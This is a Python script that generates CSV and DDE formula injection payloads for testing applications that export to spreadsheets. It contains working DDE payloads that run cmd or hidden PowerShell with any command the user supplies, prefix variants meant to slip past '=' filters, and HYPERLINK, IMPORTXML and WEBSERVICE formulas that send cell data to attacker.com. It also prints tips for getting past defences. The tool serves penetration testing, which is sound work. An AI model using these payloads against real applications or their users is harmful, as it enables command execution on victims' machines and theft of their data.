"""
CSV / DDE Formula Injection Payload Generator

Attack Vector:
    When a desktop app exports data to CSV/XLSX, or imports CSV and opens
    it in a spreadsheet-like view, injected formulas can execute commands.
    DDE (Dynamic Data Exchange) payloads execute when the user opens
    the CSV in Excel or similar applications.

    OWASP: Formula Injection / CSV Injection
    Severity: HIGH — RCE when user opens exported file in Excel

Targets:
    - Applications that export data to CSV
    - Applications that generate reports in XLSX/CSV
    - Applications with CSV import + preview in grid/table
    - Any user input that ends up in a CSV export

Usage:
    python -I csv_dde_injection.py --output payloads/ --type all
    python -I csv_dde_injection.py --output test.csv --type dde --cmd calc.exe
"""

import argparse
import os
import csv
import io


# DDE payloads — execute when opened in Excel
DDE_PAYLOADS = {
    "dde_basic": {
        "desc": "Basic DDE — opens cmd via Excel",
        "value": '=cmd|"/C calc.exe"!A1',
    },
    "dde_powershell": {
        "desc": "DDE PowerShell execution",
        "value": '=cmd|"/C powershell -nop -w hidden -c calc.exe"!A1',
    },
    "dde_plus": {
        "desc": "DDE with + prefix (bypasses = filter)",
        "value": '+cmd|"/C calc.exe"!A1',
    },
    "dde_minus": {
        "desc": "DDE with - prefix",
        "value": '-cmd|"/C calc.exe"!A1',
    },
    "dde_at": {
        "desc": "DDE with @ prefix",
        "value": '@SUM(cmd|"/C calc.exe"!A1)',
    },
    "dde_tab": {
        "desc": "DDE with tab prefix (bypass)",
        "value": '\t=cmd|"/C calc.exe"!A1',
    },
    "dde_newline": {
        "desc": "DDE with newline prefix (bypass)",
        "value": '\n=cmd|"/C calc.exe"!A1',
    },
    "dde_msexcel": {
        "desc": "MSEXCEL DDE variant",
        "value": '=MSEXCEL|"\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe"!""',
    },
}

# Formula injection payloads — for spreadsheet apps
FORMULA_PAYLOADS = {
    "hyperlink_phish": {
        "desc": "HYPERLINK formula (data exfiltration / phishing)",
        "value": '=HYPERLINK("http://attacker.com/steal?data="&A1,"Click for details")',
    },
    "importxml": {
        "desc": "IMPORTXML for Google Sheets OOB data leak",
        "value": '=IMPORTXML("http://attacker.com/steal?data="&A1,"/a")',
    },
    "webservice": {
        "desc": "WEBSERVICE for Excel OOB data leak",
        "value": '=WEBSERVICE("http://attacker.com/steal?data="&A1)',
    },
    "cmd_exec": {
        "desc": "Shell function (LibreOffice Calc)",
        "value": '=SHELL("calc.exe")',
    },
}


def generate_csv(payloads: dict, output: str, cmd: str):
    """Generate a CSV file containing formula injection payloads."""
    rows = [["ID", "Name", "Email", "Notes"]]

    for name, payload in payloads.items():
        value = payload["value"].replace("calc.exe", cmd)
        rows.append([
            "1001",
            value,  # Payload in Name field
            "user@example.com",
            payload["desc"]
        ])
        # Also test payload in other columns
        rows.append([
            "1002",
            "Normal User",
            value,  # Payload in Email field
            payload["desc"]
        ])

    with open(output, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerows(rows)


def main():
    parser = argparse.ArgumentParser(description="CSV/DDE Injection payload generator")
    parser.add_argument("--output", "-o", default=".", help="Output file or directory")
    parser.add_argument("--type", choices=["dde", "formula", "all", "fieldtest"], default="all")
    parser.add_argument("--cmd", default="calc.exe", help="Command to execute")
    args = parser.parse_args()

    print("[*] CSV/DDE Formula Injection Generator")
    print(f"[*] Command: {args.cmd}\n")

    if os.path.isdir(args.output) or args.type == "all":
        os.makedirs(args.output, exist_ok=True)

    if args.type in ("dde", "all"):
        path = os.path.join(args.output, "dde_payloads.csv") if os.path.isdir(args.output) else args.output
        generate_csv(DDE_PAYLOADS, path, args.cmd)
        print(f"[+] {path} — DDE payloads ({len(DDE_PAYLOADS)} variants)")

    if args.type in ("formula", "all"):
        path = os.path.join(args.output, "formula_payloads.csv") if os.path.isdir(args.output) else args.output
        generate_csv(FORMULA_PAYLOADS, path, args.cmd)
        print(f"[+] {path} — Formula injection payloads")

    if args.type in ("fieldtest", "all"):
        # Generate individual payloads for testing in input fields
        path = os.path.join(args.output, "field_test_payloads.txt") if os.path.isdir(args.output) else args.output
        with open(path, "w") as f:
            f.write("# Paste these into input fields that may end up in CSV/Excel exports\n")
            f.write("# Test each field: name, email, address, notes, comments, etc.\n\n")
            for name, payload in {**DDE_PAYLOADS, **FORMULA_PAYLOADS}.items():
                value = payload["value"].replace("calc.exe", args.cmd)
                f.write(f"# {payload['desc']}\n{value}\n\n")
        print(f"[+] {path} — Input field test payloads")

    print(f"\n[*] Testing steps:")
    print(f"  1. Import the CSV in the target application")
    print(f"  2. OR: inject payloads into input fields, then trigger CSV/XLSX export")
    print(f"  3. Open the exported file in Excel")
    print(f"  4. If Excel shows 'Enable Content' or DDE warning — the payload is there")
    print(f"  5. Clicking 'Yes' executes the command")
    print(f"\n[*] Defense bypass tips:")
    print(f"  - If app strips '=' prefix, try '+', '-', '@', tab, newline prefixes")
    print(f"  - If app quotes fields, try breaking out of quotes")
    print(f"  - Try Unicode variants of = (fullwidth equals: ＝)")


if __name__ == "__main__":
    main()
